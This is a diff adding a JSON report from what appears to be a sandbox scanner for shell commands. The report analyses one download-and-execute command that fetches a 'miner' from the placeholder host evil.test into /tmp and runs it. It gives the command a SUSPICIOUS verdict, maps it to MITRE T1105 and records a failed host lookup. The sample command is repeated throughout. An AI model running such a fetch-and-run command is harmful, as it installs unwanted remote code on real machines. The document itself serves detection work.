@@ -1,0 +1,239 @@
+{
+  "version": "4.1",
+  "command": "curl -fsSL http://evil.test/miner -o /tmp/.x && chmod +x /tmp/.x && /tmp/.x",
+  "timestamp": "2026-03-20T04:02:58.676995+00:00",
+  "verdict": "SUSPICIOUS",
+  "risk_score": 35,
+  "confidence": "LOW",
+  "recommendations": [
+    "REVIEW: 建议人工审核此命令后再决定是否放行",
+    "置信度较低, 可能为误报, 请结合上下文判断"
+  ],
+  "is_legitimate_pattern": false,
+  "findings_summary": {
+    "total": 1,
+    "critical": 1,
+    "warn": 0,
+    "info": 0,
+    "dimensions_hit": 1
+  },
+  "findings": [
+    {
+      "severity": "CRITICAL",
+      "dimension": "静态分析",
+      "description": "命令匹配恶意模式: download to /tmp and make executable",
+      "risk_score": 35,
+      "mitre_attack": [
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
+        }
+      ],
+      "evidence": "curl -fsSL http://evil.test/miner -o /tmp/.x && chmod +x /tmp/.x && /tmp/.x"
+    }
+  ],
+  "evidence": {
+    "command_chain": {
+      "stages": 3,
+      "connectors": [
+        "&&",
+        "&&",
+        "END"
+      ],
+      "safe_then_evil": false
+    },
+    "stdout_lines": 0,
+    "stderr_lines": 1,
+    "exec_duration_sec": 1.0,
+    "external_connections": [],
+    "c2_port_hits": [],
+    "files_added": 0,
+    "files_deleted": 0,
+    "inotify_sys_events": 0,
+    "inotify_tmp_events": 4900,
+    "exit_code": 6,
+    "critical_bins_changed": false,
+    "new_symlinks": 0,
+    "new_file_caps": 0,
+    "permission_issues": [],
+    "mitre_techniques": [
+      "T1105"
+    ]
+  },
+  "dimensions": {
+    "files_added": [],
+    "files_deleted": [],
+    "inotify_sys_events": [],
+    "inotify_tmp_events": [
+      "2026-03-20T04:02:23 CREATE /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9",
+      "2026-03-20T04:02:23 MODIFY /tmp/sortmJDtv9"
+    ],
+    "external_connections": [],
+    "suid_new": [],
+    "suid_removed": [],
+    "new_symlinks": [],
+    "new_file_caps": [],
+    "critical_bins_tampered": false,
+    "high_entropy_files": [],
+    "exit_code": 6,
+    "attack_chains": []
+  },
+  "mitre_attack": {
+    "T1105": {
+      "name": "Ingress Tool Transfer",
+      "findings": [
+        "命令匹配恶意模式: download to /tmp and make executable"
+      ]
+    }
+  },
+  "mitre_tactics": {
+    "Command and Control": [
+      "T1105"
+    ]
+  },
+  "deobfuscation": {
+    "original": "curl -fsSL http://evil.test/miner -o /tmp/.x && chmod +x /tmp/.x && /tmp/.x",
+    "deobfuscated": null,
+    "layers": []
+  },
+  "timeline": [
+    {
+      "phase": "baseline",
+      "time": "1773979315",
+      "desc": "基线采集完成"
+    },
+    {
+      "phase": "probes_start",
+      "time": "1773979337",
+      "desc": "探针启动 + 命令执行开始"
+    },
+    {
+      "phase": "exec_end",
+      "time": "1773979338",
+      "desc": "命令执行结束 (耗时 1.0s, 退出码 6)"
+    },
+    {
+      "phase": "post_snapshot",
+      "time": "1773979379",
+      "desc": "后置快照 + 分析完成"
+    }
+  ],
+  "stdout": [],
+  "stderr": [
+    "curl: (6) Could not resolve host: evil.test"
+  ],
+  "text_summary": "⚠️ 判定: SUSPICIOUS (风险分: 35/100, 置信度: LOW)\n命令: curl -fsSL http://evil.test/miner -o /tmp/.x && chmod +x /tmp/.x && /tmp/.x\n\n发现 1 个问题 (1 严重, 0 警告):\n  [CRITICAL] 静态分析: 命令匹配恶意模式: download to /tmp and make executable [T1105]\n\n涉及 ATT&CK 战术: Command and Control\n\n建议:\n  • REVIEW: 建议人工审核此命令后再决定是否放行\n  • 置信度较低, 可能为误报, 请结合上下文判断",
+  "fast_triage": {
+    "level": "REVIEW",
+    "static_score": 35,
+    "is_legitimate": false,
+    "blacklisted": false,
+    "patterns_matched": 1,
+    "matches": [
+      {
+        "pattern": "download to /tmp and make executable",
+        "mitre": "T1105",
+        "score": 35
+      }
+    ],
+    "deobfuscation_layers": 0
+  }
+}
